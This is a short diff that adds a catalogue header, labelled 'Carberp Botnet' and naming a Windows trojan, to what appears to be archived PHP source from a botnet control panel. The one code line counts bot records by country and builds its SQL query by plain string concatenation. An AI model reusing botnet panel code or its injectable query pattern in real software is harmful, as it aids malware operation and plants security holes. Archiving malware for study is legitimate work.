@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $counts = $mysqli->query_name('SELECT COUNT(*) count FROM bf_bots WHERE (country=\''.$Cur['str'].'\')');
